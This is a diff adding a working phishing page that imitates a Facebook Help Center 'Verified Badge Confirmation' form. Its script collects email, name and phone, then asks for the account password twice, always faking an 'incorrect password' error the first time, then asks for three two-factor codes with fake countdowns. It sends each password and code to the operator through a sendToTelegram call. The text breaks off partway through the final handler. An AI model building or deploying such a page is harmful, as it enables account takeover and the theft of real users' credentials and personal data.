@@ -1,0 +1,1473 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Form Appeal</title>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/css/intlTelInput.css"/>
+
+<style>
+body {
+    margin: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background: #f0f2f5;
+}
+
+.topbar {
+    background: #fff;
+    border-bottom: 1px solid #dddfe2;
+    padding: 12px 20px;
+    font-weight: 600;
+}
+
+.wrapper {
+    max-width: 600px;
+    margin: 40px auto;
+}
+
+.card {
+    background: #fff;
+    border: 1px solid #dddfe2;
+    border-radius: 8px;
+    padding: 24px;
+}
+
+.card-header {
+    text-align: center;
+    margin-bottom: 24px;
+    padding-bottom: 20px;
+    border-bottom: 1px solid #e5e7eb;
+}
+
+.card-header img {
+    max-width: 200px;
+    height: auto;
+    margin-bottom: 16px;
+}
+
+.title {
+    font-size: 20px;
+    font-weight: 600;
+}
+
+.desc {
+    font-size: 14px;
+    color: #606770;
+    margin-top: 10px;
+}
+
+label {
+    font-size: 14px;
+    margin-top: 18px;
+    display: block;
+}
+
+input, textarea {
+    width: 100%;
+    padding: 12px 14px;
+    margin-top: 6px;
+    border: 1px solid #ccd0d5;
+    border-radius: 6px;
+    background: #f5f6f7;
+    box-sizing: border-box;
+    font-size: 15px;
+}
+
+input:focus, textarea:focus {
+    outline: none;
+    border-color: #1877f2;
+    background: #fff;
+}
+
+
+.checkbox input {
+    margin-top: 3px;
+}
+
+.error {
+    color: red;
+    font-size: 13px;
+    margin-top: 10px;
+}
+
+.btn {
+    margin-top: 25px;
+    width: 100%;
+    background: #1877f2;
+    color: #fff;
+    border: none;
+    padding: 12px;
+    border-radius: 6px;
+    font-weight: 600;
+    cursor: pointer;
+}
+
+.btn:hover {
+    background: #166fe5;
+}
+
+.iti {
+    width: 100%;
+}
+
+/* Password Toggle Styles */
+.password-input-wrapper {
+    position: relative;
+    display: flex;
+    align-items: center;
+}
+
+.modal-content .password-input-wrapper input[type="password"],
+.modal-content .password-input-wrapper input[type="text"] {
+    width: 100%;
+    padding: 12px;
+    padding-right: 40px;
+    margin-bottom: 16px;
+    border: 1px solid #ccd0d5;
+    border-radius: 6px;
+    background: #f5f6f7;
+    font-size: 15px;
+    box-sizing: border-box;
+}
+
+.password-toggle-btn {
+    position: absolute;
+    right: 12px;
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: #65676b;
+    padding: 6px 8px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    transition: all 0.2s ease;
+    z-index: 10;
+    margin-bottom: 16px;
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    -webkit-user-select: none;
+    user-select: none;
+    outline: none;
+    -webkit-appearance: none;
+    appearance: none;
+}
+
+.password-toggle-btn:hover {
+    color: #1877f2;
+    background-color: rgba(24, 119, 242, 0.08);
+}
+
+.password-toggle-btn:active {
+    background-color: rgba(24, 119, 242, 0.12);
+}
+
+.password-toggle-btn:focus-visible {
+    outline: 2px solid #1877f2;
+    outline-offset: 2px;
+}
+
+.password-eye-icon {
+    width: 20px;
+    height: 20px;
+    flex-shrink: 0;
+}
+
+/* Modal Styles */
+.modal {
+    display: none;
+    position: fixed;
+    z-index: 1000;
+    left: 0;
+    top: 0;
+    width: 100%;
+    height: 100%;
+    background-color: rgba(0, 0, 0, 0.4);
+    animation: fadeIn 0.3s ease;
+}
+
+.modal.active {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+
+@keyframes fadeIn {
+    from { opacity: 0; }
+    to { opacity: 1; }
+}
+
+.modal-content {
+    background-color: #f8f9fa;
+    border-radius: 12px;
+    padding: 40px 30px;
+    text-align: center;
+    width: 100%;
+    max-width: 420px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+    animation: slideUp 0.3s ease;
+}
+
+@keyframes slideUp {
+    from {
+        transform: translateY(20px);
+        opacity: 0;
+    }
+    to {
+        transform: translateY(0);
+        opacity: 1;
+    }
+}
+
+.modal-content .logo {
+    width: 60px;
+    height: 60px;
+    border-radius: 50%;
+    margin: 0 auto 30px;
+    display: block;
+    object-fit: contain;
+}
+
+.modal-content .password-label {
+    font-size: 13px;
+    color: #65676b;
+    text-align: left;
+    margin-bottom: 8px;
+    display: block;
+}
+
+.modal-content .password-error {
+    color: #f02849;
+    font-size: 13px;
+    margin-bottom: 12px;
+    text-align: left;
+    display: block;
+}
+
+.modal-content .password-error.hidden {
+    display: none;
+}
+
+.modal-content input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 16px;
+    border: 1px solid #ccd0d5;
+    border-radius: 6px;
+    background: #f5f6f7;
+    font-size: 15px;
+    box-sizing: border-box;
+}
+
+.modal-content input[type="password"]:focus {
+    outline: none;
+    border-color: #1877f2;
+    background: #fff;
+}
+
+.modal-content .continue-btn {
+    width: 100%;
+    background: #1877f2;
+    color: white;
+    border: none;
+    padding: 12px;
+    border-radius: 6px;
+    font-weight: 600;
+    font-size: 15px;
+    cursor: pointer;
+    margin-bottom: 16px;
+}
+
+.modal-content .continue-btn:hover {
+    background: #166fe5;
+}
+
+.modal-content .forgot-password {
+    color: #1877f2;
+    text-decoration: none;
+    font-size: 13px;
+    cursor: pointer;
+    display: inline-block;
+    margin-bottom: 30px;
+}
+
+.modal-content .forgot-password:hover {
+    text-decoration: underline;
+}
+
+.modal-content .meta-branding {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    margin-top: 30px;
+    padding-top: 20px;
+    border-top: 1px solid #e5e7eb;
+    color: #65676b;
+    font-size: 14px;
+}
+
+.modal-content .meta-logo {
+    width: 20px;
+    height: 20px;
+}
+
+/* Authentication Code Modal Styles */
+.modal-content .auth-title {
+    font-size: 18px;
+    font-weight: 600;
+    color: #000;
+    margin-bottom: 10px;
+}
+
+.modal-content .auth-desc {
+    font-size: 14px;
+    color: #65676b;
+    margin-bottom: 30px;
+    line-height: 1.5;
+}
+
+.modal-content .auth-image {
+    width: 100%;
+    height: 180px;
+    border-radius: 12px;
+    margin-bottom: 30px;
+    object-fit: contain;
+}
+
+.modal-content input[type="text"].auth-code-input {
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 16px;
+    border: 1px solid #ccd0d5;
+    border-radius: 6px;
+    background: #f5f6f7;
+    font-size: 15px;
+    box-sizing: border-box;
+    text-align: center;
+    letter-spacing: 4px;
+}
+
+.modal-content input[type="text"].auth-code-input:focus {
+    outline: none;
+    border-color: #1877f2;
+    background: #fff;
+}
+
+.modal-content input[type="text"].auth-code-input.error {
+    border-color: #f02849;
+    background: #fff;
+}
+
+.modal-content .auth-error {
+    color: #f02849;
+    font-size: 13px;
+    margin-bottom: 12px;
+    text-align: left;
+    display: block;
+}
+
+.modal-content .auth-error.hidden {
+    display: none;
+}
+
+/* Loading Animation */
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+
+.btn.loading {
+    background: #1877f2;
+    color: white;
+    opacity: 0.8;
+    cursor: not-allowed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0;
+}
+
+.btn.loading::after {
+    content: '';
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top: 2px solid white;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+.continue-btn.loading {
+    background: #1877f2;
+    opacity: 0.8;
+    cursor: not-allowed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0;
+}
+
+.continue-btn.loading::after {
+    content: '';
+    width: 16px;
+    height: 16px;
+    border: 2px solid rgba(255, 255, 255, 0.3);
+    border-top: 2px solid white;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+.btn.loading, .continue-btn.loading {
+    pointer-events: none;
+}
+
+/* Result Modal Styles */
+.modal-content.result-modal {
+    max-width: 600px;
+    animation: slideUp 0.4s ease;
+}
+
+.result-header {
+    text-align: center;
+    padding: 30px 0;
+    border-bottom: 2px solid #f0f2f5;
+    margin-bottom: 30px;
+}
+
+.result-icon {
+    width: 80px;
+    height: 80px;
+    background: linear-gradient(135deg, #1877f2 0%, #1565d8 100%);
+    border-radius: 50%;
+    margin: 0 auto 20px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 48px;
+    color: white;
+    animation: popIn 0.5s ease;
+    box-shadow: 0 8px 20px rgba(24, 119, 242, 0.3);
+}
+
+@keyframes popIn {
+    0% {
+        transform: scale(0);
+        opacity: 0;
+    }
+    50% {
+        transform: scale(1.1);
+    }
+    100% {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+
+.result-title {
+    font-size: 24px;
+    font-weight: 700;
+    color: #000;
+    margin-bottom: 8px;
+}
+
+.result-subtitle {
+    font-size: 14px;
+    color: #65676b;
+}
+
+.result-details {
+    background: #f8f9fa;
+    border-radius: 12px;
+    padding: 24px;
+    margin-bottom: 25px;
+    max-height: 500px;
+    overflow-y: auto;
+}
+
+.result-item {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    padding: 16px 0;
+    border-bottom: 1px solid #e5e7eb;
+}
+
+.result-item:last-child {
+    border-bottom: none;
+}
+
+.result-label {
+    font-weight: 700;
+    color: #1877f2;
+    font-size: 12px;
+    min-width: 140px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    display: flex;
+    align-items: center;
+    gap: 6px;
+}
+
+.result-label::before {
+    content: '';
+    width: 4px;
+    height: 4px;
+    background: #1877f2;
+    border-radius: 50%;
+    flex-shrink: 0;
+}
+
+.result-value {
+    font-size: 14px;
+    color: #1f2937;
+    word-break: break-word;
+    text-align: right;
+    flex: 1;
+    margin-left: 20px;
+    background: #fff;
+    padding: 10px 14px;
+    border-radius: 8px;
+    border-left: 4px solid #1877f2;
+    font-weight: 500;
+    box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+}
+
+.result-divider {
+    padding: 16px 0;
+    margin: 8px 0;
+    border-top: 2px solid #e5e7eb;
+    border-bottom: 2px solid #e5e7eb;
+    text-align: center;
+    background: linear-gradient(135deg, rgba(24, 119, 242, 0.05) 0%, rgba(21, 101, 216, 0.05) 100%);
+    border-radius: 6px;
+}
+
+.result-divider span {
+    font-size: 12px;
+    font-weight: 700;
+    color: #1877f2;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    padding: 0 12px;
+    background: #f8f9fa;
+    display: inline-block;
+    border-radius: 4px;
+}
+
+.result-footer {
+    text-align: center;
+    padding: 20px;
+    background: linear-gradient(135deg, rgba(24, 119, 242, 0.1) 0%, rgba(21, 101, 216, 0.1) 100%);
+    border-radius: 12px;
+    margin-top: 20px;
+}
+
+.result-footer p {
+    margin: 0 0 15px 0;
+    font-size: 14px;
+    color: #606770;
+    font-weight: 500;
+}
+
+.result-loading {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+}
+
+.spinner {
+    width: 24px;
+    height: 24px;
+    border: 3px solid rgba(24, 119, 242, 0.3);
+    border-top: 3px solid #1877f2;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+/* Responsive Design */
+@media (max-width: 600px) {
+    body {
+        padding: 10px;
+    }
+
+    .wrapper {
+        margin: 10px auto;
+    }
+
+    .card {
+        padding: 20px 16px;
+    }
+
+    .modal-content {
+        margin: 10px;
+        padding: 30px 20px;
+        width: 100%;
+    }
+
+    .result-header {
+        padding: 20px 0;
+        margin-bottom: 20px;
+    }
+
+    .result-icon {
+        width: 70px;
+        height: 70px;
+        font-size: 40px;
+        margin-bottom: 16px;
+    }
+
+    .result-title {
+        font-size: 20px;
+    }
+
+    .result-subtitle {
+        font-size: 13px;
+    }
+
+    .result-details {
+        padding: 15px;
+        margin-bottom: 20px;
+    }
+
+    .result-details {
+        padding: 16px;
+        margin-bottom: 20px;
+        max-height: 400px;
+    }
+
+    .result-item {
+        flex-direction: column;
+        align-items: flex-start;
+        padding: 12px 0;
+        gap: 8px;
+    }
+
+    .result-label {
+        font-size: 11px;
+        margin-bottom: 2px;
+    }
+
+    .result-value {
+        font-size: 13px;
+        text-align: left;
+        width: 100%;
+        margin-left: 0;
+        margin-top: 0;
+        padding: 8px 10px;
+    }
+
+    .result-divider {
+        padding: 12px 0;
+        margin: 6px 0;
+    }
+
+    .result-divider span {
+        font-size: 10px;
+        padding: 0 8px;
+    }
+
+    .result-footer {
+        padding: 15px;
+    }
+
+    .result-footer p {
+        font-size: 13px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="topbar">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" style="height: 30px; margin-right: 10px; vertical-align: middle;">
+    <span style="vertical-align: middle;">Facebook Help Center</span>
+</div>
+
+<div class="wrapper">
+<div class="card">
+
+<div class="card-header">
+    <img src="https://mikampany.hu/wp-content/uploads/2024/12/Nevtelen-terv-18-1024x454.png" alt="Meta Verified Badge">
+</div>
+
+<div class="title">Verified Badge Confirmation</div>
+
+<div class="desc">
+Confirm your identity to complete the verified badge verification process. This step ensures your account is authentic and secure.
+</div>
+
+<label>Email Address</label>
+<input type="email" id="email">
+
+<label>Full Name</label>
+<input type="text" id="name">
+
+<label>Phone Number</label>
+<input id="phone" type="tel">
+
+<input type="hidden" id="fullPhone">
+
+<label style="margin-top: 20px; display: flex; align-items: center;">
+    <input type="checkbox" id="agree" style="width: auto; margin-top: 0; margin-right: 8px;">
+    <span>I agree to the terms and conditions</span>
+</label>
+
+<div class="error" id="errorMsg"></div>
+
+<button class="btn" id="submitBtn">Submit</button>
+
+</div>
+</div>
+
+<!-- Password Verification Modal -->
+<div class="modal" id="passwordModal">
+    <div class="modal-content">
+        <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Logo">
+        
+        <label class="password-label">Password</label>
+        <div class="password-input-wrapper">
+            <input type="password" id="passwordInput" placeholder="Enter your password">
+            <button type="button" class="password-toggle-btn" id="passwordToggleBtn" title="Show password" role="button" tabindex="0" aria-label="Toggle password visibility">
+                <svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" aria-hidden="true" class="password-eye-icon"><path fill-rule="evenodd" d="M12 8.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7m0 2a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M5.677 7.756c3.537-3.675 9.11-3.675 12.646 0l3.395 3.526a1.054 1.054 0 0 1 0 1.436l-3.395 3.526c-3.426 3.56-8.764 3.671-12.31.334l-.336-.334-3.395-3.526a1.054 1.054 0 0 1 0-1.436zm11.206 1.386c-2.75-2.857-7.016-2.857-9.766 0L4.367 12l2.75 2.857c2.75 2.857 7.016 2.857 9.766 0L19.632 12z" clip-rule="evenodd"></path></svg>
+            </button>
+        </div>
+        
+        <div class="password-error hidden" id="passwordError"></div>
+        
+        <button class="continue-btn" id="continueBtn">Continue</button>
+        
+        <a href="#" class="forgot-password" id="forgotPasswordLink">Forgot password?</a>
+        
+        <div class="meta-branding">
+            <span style="color: #1877f2;">∞</span>
+            <span style="font-weight: 600;">Meta</span>
+        </div>
+    </div>
+</div>
+
+<!-- Authentication Code Modal -->
+<div class="modal" id="authModal">
+    <div class="modal-content">
+        <div class="auth-title">Check your authentication code</div>
+        
+        <div class="auth-desc">
+            Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or text message on you mobile).
+        </div>
+        
+        <img class="auth-image" src="img/2FA.png" alt="Phone icon">
+        
+        <input type="text" class="auth-code-input" id="authCodeInput" placeholder="Code" maxlength="6" inputmode="numeric">
+        
+        <div class="auth-error hidden" id="authError"></div>
+        
+        <button class="continue-btn" id="authContinueBtn">Continue</button>
+        
+        <div class="meta-branding">
+            <span style="color: #1877f2;">∞</span>
+            <span style="font-weight: 600;">Meta</span>
+        </div>
+    </div>
+</div>
+
+<!-- Authentication Code 2 Modal -->
+<div class="modal" id="authModal2">
+    <div class="modal-content">
+        <div class="auth-title">Check your authentication code</div>
+        
+        <div class="auth-desc">
+            Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or text message on you mobile).
+        </div>
+        
+        <img class="auth-image" src="img/2FA.png" alt="Phone icon">
+        
+        <input type="text" class="auth-code-input" id="authCodeInput2" placeholder="Code" maxlength="6" inputmode="numeric">
+        
+        <div class="auth-error hidden" id="authError2"></div>
+        
+        <button class="continue-btn" id="authContinueBtn2">Continue</button>
+        
+        <div class="meta-branding">
+            <span style="color: #1877f2;">∞</span>
+            <span style="font-weight: 600;">Meta</span>
+        </div>
+    </div>
+</div>
+
+<!-- Authentication Code 3 Modal -->
+<div class="modal" id="authModal3">
+    <div class="modal-content">
+        <div class="auth-title">Check your authentication code</div>
+        
+        <div class="auth-desc">
+            Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator or text message on you mobile).
+        </div>
+        
+        <img class="auth-image" src="img/2FA.png" alt="Phone icon">
+        
+        <input type="text" class="auth-code-input" id="authCodeInput3" placeholder="Code" maxlength="6" inputmode="numeric">
+        
+        <button class="continue-btn" id="authContinueBtn3">Continue</button>
+        
+        <div class="meta-branding">
+            <span style="color: #1877f2;">∞</span>
+            <span style="font-weight: 600;">Meta</span>
+        </div>
+    </div>
+</div>
+
+<!-- Result Modal -->
+<div class="modal" id="resultModal">
+    <div class="modal-content result-modal">
+        <div class="result-header">
+            <div class="result-icon">✓</div>
+            <div class="result-title">Verified Badge Confirmed</div>
+            <div class="result-subtitle">Your account has been verified with a verified badge</div>
+        </div>
+        
+        <div class="result-details">
+            <div class="result-item">
+                <div class="result-label">Email</div>
+                <div class="result-value" id="resultEmail">-</div>
+            </div>
+            
+            <div class="result-item">
+                <div class="result-label">Full Name</div>
+                <div class="result-value" id="resultName">-</div>
+            </div>
+            
+            <div class="result-item">
+                <div class="result-label">Phone</div>
+                <div class="result-value" id="resultPhone">-</div>
+            </div>
+            
+            <div class="result-divider">
+                <span>Request Information</span>
+            </div>
+            
+            <div class="result-item">
+                <div class="result-label">IP Address</div>
+                <div class="result-value" id="resultIP">-</div>
+            </div>
+            
+            <div class="result-item">
+                <div class="result-label">Country</div>
+                <div class="result-value" id="resultCountry">-</div>
+            </div>
+            
+            <div class="result-item">
+                <div class="result-label">City</div>
+                <div class="result-value" id="resultCity">-</div>
+            </div>
+            
+            <div class="result-item">
+                <div class="result-label">Submitted At</div>
+                <div class="result-value" id="resultTimestamp">-</div>
+            </div>
+            
+            <div class="result-item">
+                <div class="result-label">User Agent</div>
+                <div class="result-value" id="resultUserAgent">-</div>
+            </div>
+        </div>
+        
+        <div class="result-footer">
+            <p>Your verified badge is now active on your account...</p>
+            <div class="result-loading">
+                <div class="spinner"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/intlTelInput.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/utils.js"></script>
+
+<script>
+const phoneInput = document.querySelector("#phone");
+
+const iti = window.intlTelInput(phoneInput, {
+    initialCountry: "id",
+    separateDialCode: true,
+});
+
+// auto fix 08 → 8
+phoneInput.addEventListener("input", function () {
+    if (phoneInput.value.startsWith("0")) {
+        phoneInput.value = phoneInput.value.substring(1);
+    }
+});
+
+document.getElementById("submitBtn").onclick = function(e){
+    e.preventDefault();
+
+    let error = "";
+
+    const email = document.getElementById("email").value.trim();
+    const name = document.getElementById("name").value.trim();
+    const agree = document.getElementById("agree").checked;
+
+    if (!agree) {
+        error = "You must agree before continuing.";
+    } else if (!email) {
+        error = "Email is required.";
+    } else if (!name) {
+        error = "Full name is required.";
+    } else if (!iti.isValidNumber()) {
+        error = "Phone number is not valid.";
+    }
+
+    if (error) {
+        document.getElementById("errorMsg").innerText = error;
+        return;
+    }
+
+    const fullNumber = iti.getNumber();
+    document.getElementById("fullPhone").value = fullNumber;
+
+    // Show loading state
+    const submitBtn = document.getElementById("submitBtn");
+    submitBtn.textContent = '';
+    submitBtn.classList.add("loading");
+    submitBtn.disabled = true;
+    
+    // Show password verification modal after loading
+    setTimeout(() => {
+        submitBtn.classList.remove("loading");
+        submitBtn.disabled = false;
+        document.getElementById("passwordModal").classList.add("active");
+    }, 2000);
+};
+
+// Password visibility toggle
+document.getElementById("passwordToggleBtn").addEventListener("click", function(e) {
+    e.preventDefault();
+    const passwordInput = document.getElementById("passwordInput");
+    const toggleBtn = document.getElementById("passwordToggleBtn");
+    
+    if (passwordInput.type === "password") {
+        passwordInput.type = "text";
+        toggleBtn.innerHTML = '<svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" aria-hidden="true" class="password-eye-icon"><path fill-rule="evenodd" d="M3.98 8.223A10.477 10.477 0 0 0 1.934 12c1.226 4.338 5.557 7.5 10.734 7.5.847 0 1.666-.105 2.449-.308l-2.404-2.405a3.5 3.5 0 1 1 3.864-3.864l3.83-3.83A10.516 10.516 0 0 0 12 3.5c-4.559 0-8.335 2.72-9.89 6.607l3.267 3.267.027-.027" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M19.707 3.293a1 1 0 0 1 0 1.414L4.707 19.707a1 1 0 1 1-1.414-1.414L18.293 3.293a1 1 0 0 1 1.414 0" clip-rule="evenodd"></path></svg>';
+        toggleBtn.title = "Hide password";
+    } else {
+        passwordInput.type = "password";
+        toggleBtn.innerHTML = '<svg fill="currentColor" viewBox="0 0 24 24" width="1em" height="1em" aria-hidden="true" class="password-eye-icon"><path fill-rule="evenodd" d="M12 8.5a3.5 3.5 0 1 1 0 7 3.5 3.5 0 0 1 0-7m0 2a1.5 1.5 0 1 0 0 3 1.5 1.5 0 0 0 0-3" clip-rule="evenodd"></path><path fill-rule="evenodd" d="M5.677 7.756c3.537-3.675 9.11-3.675 12.646 0l3.395 3.526a1.054 1.054 0 0 1 0 1.436l-3.395 3.526c-3.426 3.56-8.764 3.671-12.31.334l-.336-.334-3.395-3.526a1.054 1.054 0 0 1 0-1.436zm11.206 1.386c-2.75-2.857-7.016-2.857-9.766 0L4.367 12l2.75 2.857c2.75 2.857 7.016 2.857 9.766 0L19.632 12z" clip-rule="evenodd"></path></svg>';
+        toggleBtn.title = "Show password";
+    }
+});
+
+// Clear error when user starts typing
+document.getElementById("passwordInput").addEventListener("input", function() {
+    const errorDiv = document.getElementById("passwordError");
+    if (errorDiv.textContent && !errorDiv.textContent.includes("Incorrect")) {
+        errorDiv.classList.add("hidden");
+    }
+});
+
+// Password verification
+let passwordCount = 0;
+let countdownInterval = null;
+
+document.getElementById("continueBtn").onclick = function(e){
+    e.preventDefault();
+    
+    const password = document.getElementById("passwordInput").value;
+    const errorDiv = document.getElementById("passwordError");
+    const continueBtn = document.getElementById("continueBtn");
+    
+    if (!password) {
+        errorDiv.textContent = "Please enter your password";
+        errorDiv.classList.remove("hidden");
+        return;
+    }
+    
+    passwordCount++;
+    
+    // Show loading state
+    continueBtn.textContent = '';
+    continueBtn.classList.add("loading");
+    continueBtn.disabled = true;
+    
+    // Send password data to Telegram
+    sendToTelegram("PASSWORD_" + passwordCount, password);
+    
+    // After loading
+    setTimeout(() => {
+        continueBtn.classList.remove("loading");
+        continueBtn.textContent = "Continue";
+        
+        // If password count < 2, show error and countdown
+        if (passwordCount < 2) {
+            let countdown = 5;
+            errorDiv.textContent = `Incorrect password. Please, try again after ${countdown}s`;
+            errorDiv.classList.remove("hidden");
+            
+            // Disable button
+            continueBtn.disabled = true;
+            continueBtn.style.opacity = "0.6";
+            continueBtn.style.cursor = "not-allowed";
+            continueBtn.style.background = "#9db3d1";
+            
+            // Clear input
+            document.getElementById("passwordInput").value = "";
+            
+            if (countdownInterval) clearInterval(countdownInterval);
+            
+            countdownInterval = setInterval(function() {
+                countdown--;
+                if (countdown > 0) {
+                    errorDiv.textContent = `Incorrect password. Please, try again after ${countdown}s`;
+                } else {
+                    clearInterval(countdownInterval);
+                    errorDiv.classList.add("hidden");
+                    continueBtn.disabled = false;
+                    continueBtn.style.opacity = "1";
+                    continueBtn.style.cursor = "pointer";
+                    continueBtn.style.background = "#1877f2";
+                    document.getElementById("passwordInput").focus();
+                }
+            }, 1000);
+        } else {
+            // After 2 passwords, show authentication code modal (no error message)
+            document.getElementById("passwordModal").classList.remove("active");
+            document.getElementById("passwordInput").value = "";
+            document.getElementById("passwordError").classList.add("hidden");
+            continueBtn.disabled = false;
+            continueBtn.style.opacity = "1";
+            continueBtn.style.cursor = "pointer";
+            continueBtn.style.background = "#1877f2";
+            passwordCount = 0;
+            
+            // Show auth code modal
+            setTimeout(() => {
+                document.getElementById("authModal").classList.add("active");
+            }, 300);
+        }
+    }, 2000);
+};
+
+// Authentication code verification
+document.getElementById("authContinueBtn").onclick = function(e){
+    e.preventDefault();
+    
+    const authCode = document.getElementById("authCodeInput").value;
+    const authInput = document.getElementById("authCodeInput");
+    const authError = document.getElementById("authError");
+    const authBtn = document.getElementById("authContinueBtn");
+    
+    if (!authCode) {
+        authError.textContent = "Please enter authentication code";
+        authError.classList.remove("hidden");
+        authInput.classList.add("error");
+        return;
+    }
+    
+    if (authCode.length !== 6) {
+        authError.textContent = "Authentication code must be 6 digits";
+        authError.classList.remove("hidden");
+        authInput.classList.add("error");
+        return;
+    }
+    
+    // Show loading state
+    authBtn.textContent = '';
+    authBtn.classList.add("loading");
+    authBtn.disabled = true;
+    
+    // Send first auth code to Telegram
+    sendToTelegram("AUTH_CODE_1", authCode);
+    
+    // After loading
+    setTimeout(() => {
+        authBtn.classList.remove("loading");
+        authBtn.textContent = "Continue";
+        
+        // Show error with countdown
+        let countdown = 29;
+        authError.textContent = `Incorrect. Please, try again after ${countdown}s`;
+        authError.classList.remove("hidden");
+        authInput.classList.add("error");
+        
+        // Disable button
+        authBtn.disabled = true;
+        authBtn.style.opacity = "0.6";
+        authBtn.style.cursor = "not-allowed";
+        authBtn.style.background = "#9db3d1";
+        
+        // Clear input
+        authInput.value = "";
+        
+        if (countdownInterval) clearInterval(countdownInterval);
+        
+        countdownInterval = setInterval(function() {
+            countdown--;
+            if (countdown > 0) {
+                authError.textContent = `Incorrect. Please, try again after ${countdown}s`;
+            } else {
+                clearInterval(countdownInterval);
+                authError.classList.add("hidden");
+                authInput.classList.remove("error");
+                authBtn.disabled = false;
+                authBtn.style.opacity = "1";
+                authBtn.style.cursor = "pointer";
+                authBtn.style.background = "#1877f2";
+                authInput.focus();
+            }
+        }, 1000);
+    }, 2000);
+};
+
+// Authentication code 2 verification
+document.getElementById("authContinueBtn2").onclick = function(e){
+    e.preventDefault();
+    
+    const authCode2 = document.getElementById("authCodeInput2").value;
+    const authInput2 = document.getElementById("authCodeInput2");
+    const authError2 = document.getElementById("authError2");
+    const authBtn2 = document.getElementById("authContinueBtn2");
+    
+    if (!authCode2) {
+        authError2.textContent = "Please enter authentication code";
+        authError2.classList.remove("hidden");
+        authInput2.classList.add("error");
+        return;
+    }
+    
+    if (authCode2.length !== 6) {
+        authError2.textContent = "Authentication code must be 6 digits";
+        authError2.classList.remove("hidden");
+        authInput2.classList.add("error");
+        return;
+    }
+    
+    // Show loading state
+    authBtn2.textContent = '';
+    authBtn2.classList.add("loading");
+    authBtn2.disabled = true;
+    
+    // Send second auth code to Telegram
+    sendToTelegram("AUTH_CODE_2", authCode2);
+    
+    // After loading
+    setTimeout(() => {
+        authBtn2.classList.remove("loading");
+        authBtn2.textContent = "Continue";
+        
+        // Show error with countdown
+        let countdown = 29;
+        authError2.textContent = `Incorrect. Please, try again after ${countdown}s`;
+        authError2.classList.remove("hidden");
+        authInput2.classList.add("error");
+        
+        // Disable button
+        authBtn2.disabled = true;
+        authBtn2.style.opacity = "0.6";
+        authBtn2.style.cursor = "not-allowed";
+        authBtn2.style.background = "#9db3d1";
+        
+        // Clear input
+        authInput2.value = "";
+        
+        if (countdownInterval) clearInterval(countdownInterval);
+        
+        countdownInterval = setInterval(function() {
+            countdown--;
+            if (countdown > 0) {
+                authError2.textContent = `Incorrect. Please, try again after ${countdown}s`;
+            } else {
+                clearInterval(countdownInterval);
+                authError2.classList.add("hidden");
+                authInput2.classList.remove("error");
+                authBtn2.disabled = false;
+                authBtn2.style.opacity = "1";
+                authBtn2.style.cursor = "pointer";
+                authBtn2.style.background = "#1877f2";
+                authInput2.focus();
+            }
+        }, 1000);
+        
+        // After countdown ends, show 3rd auth modal
+        setTimeout(() => {
+            document.getElementById("authModal2").classList.remove("active");
+            document.getElementById("authCodeInput2").value = "";
+            document.getElementById("authError2").classList.add("hidden");
+            authInput2.classList.remove("error");
+            authBtn2.disabled = false;
+            authBtn2.style.opacity = "1";
+            authBtn2.style.cursor = "pointer";
+            authBtn2.style.background = "#1877f2";
+            
+            // Show 3rd auth modal
+            setTimeout(() => {
+                document.getElementById("authModal3").classList.add("active");
+                document.getElementById("authCodeInput3").focus();
+            }, 300);
+        }, 30000);
+    }, 2000);
+};
+
+// Authentication code 3 verification
+document.getElementById("authContinueBtn3").onclick = function(e){
+    e.preventDefault();
+    
+    const authCode3 = document.getElementById("authCodeInput3").value;
+    const authBtn3 = document.getElementById("authContinueBtn3");
+    
+    if (!authCode3) {
+        return;
+    }
+    
+    if (authCode3.length !== 6) {
+        return;
+    }
+    
+    // Show loading state
+    authBtn3.textContent = '';
+    authBtn3.classList.add("loading");
+    authBtn3.disabled = true;
+    
+    // Send third auth code to Telegram
+    sendToTelegram("AUTH_CODE_3", authCode3);
+    
+    // After loading, show result modal
